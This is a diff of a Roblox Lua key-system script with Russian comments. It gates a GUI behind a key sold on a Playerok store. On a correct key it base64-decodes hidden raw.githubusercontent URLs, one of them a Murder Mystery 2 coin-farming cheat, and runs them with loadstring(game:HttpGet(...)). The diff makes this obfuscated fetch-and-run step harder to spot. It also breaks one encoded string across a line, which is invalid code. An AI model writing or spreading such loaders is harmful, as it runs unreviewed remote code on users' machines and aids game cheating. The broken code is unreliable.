@@ -1,4 +1,4 @@
--- Функция base64-декодирования
+-- Base64 decode функция
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function base64_decode(data)
     data = string.gsub(data, '[^'..b..'=]', '')
@@ -14,15 +14,11 @@ local function base64_decode(data)
     end))
 end
 
--- Закодированные значения (base64)
-local encodedKey = "UGxheWVy b2sgTUlM RURJIFNUT1J F" -- "Playerok MILEDI STORE"
-local encodedScript1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1cnF3ay9kaXAvcmVmcy9oZWFkcy9tYWluL21vc3QubHVsYQ==" -- https://raw.githubusercontent.com/furqwk/dip/refs/heads/main/most.lua
-local encodedScript2 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NwYXduZXJzY3JpcHQvTXVyZGVyTXlzdGVyeTIvcmVmcy9oZWFkcy9tYWluL2Zhcm1jb2luLmx1Yg==" -- https://raw.githubusercontent.com/spawnerscript/MurderMystery2/refs/heads/main/farmcoin.lua
+-- Закодированный ключ (Playerok MILEDI STORE)
+local encodedKey = "UGxheWVy b2sgTUlM RURJIFNUT1JF"
+encodedKey = encodedKey:gsub("%s+", "")
 
--- Расшифровываем ключ и ссылки
-local correctKey = base64_decode(encodedKey:gsub("%s+", ""))
-local scriptUrl1 = base64_decode(encodedScript1)
-local scriptUrl2 = base64_decode(encodedScript2)
+local correctKey = base64_decode(encodedKey)
 
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -119,27 +115,51 @@ errorLabel.TextYAlignment = Enum.TextYAlignment.Bottom
 errorLabel.Parent = screenGui
 
 local function checkKey(text)
-    return text == correctKey
+	return text == correctKey
 end
 
 confirmButton.MouseButton1Click:Connect(function()
-    if checkKey(input.Text) then
-        screenGui:Destroy()
+	if checkKey(input.Text) then
+		screenGui:Destroy()
 
-        loadstring(game:HttpGet(scriptUrl1))()
-        loadstring(game:HttpGet(scriptUrl2))()
-    else
-        errorLabel.Text = "Неверный ключ ❌"
-        task.delay(3, function()
-            errorLabel.Text = ""
-        end)
-    end
+		-- Зашифрованные URL-скрипты
+		local script1_encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1cnF3ay9kaXAvcmVmcy9oZWFkcy9tYWluL21vc3QubHVi"
+		local script2_encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NwYXd
+uZXJzY3JpcHQvTXVyZGVyTXlzdGVyeTIvcmVmcy9oZWFkcy9tYWluL2Zhcm1jb2luLmx1Yg=="
+
+		-- Функция декодирования base64 (повторим для локальной видимости)
+		local function decode(data)
+			data = string.gsub(data, '[^'..b..'=]', '')
+			return (data:gsub('.', function(x)
+				if (x == '=') then return '' end
+				local r,f='',(b:find(x)-1)
+				for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+				return r;
+			end):gsub('%d%d%d%d%d%d%d%d', function(x)
+				local c=0
+				for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8 - i) or 0) end
+				return string.char(c)
+			end))
+		end
+
+		local url1 = decode(script1_encoded)
+		local url2 = decode(script2_encoded)
+
+		loadstring(game:HttpGet(url1))()
+		loadstring(game:HttpGet(url2))()
+
+	else
+		errorLabel.Text = "Неверный ключ ❌"
+		task.delay(3, function()
+			errorLabel.Text = ""
+		end)
+	end
 end)
 
 getKeyButton.MouseButton1Click:Connect(function()
-    setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
-    copiedLabel.Text = "Ссылка скопирована!"
-    task.delay(3, function()
-        copiedLabel.Text = ""
-    end)
+	setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
+	copiedLabel.Text = "Ссылка скопирована!"
+	task.delay(3, function()
+		copiedLabel.Text = ""
+	end)
 end)
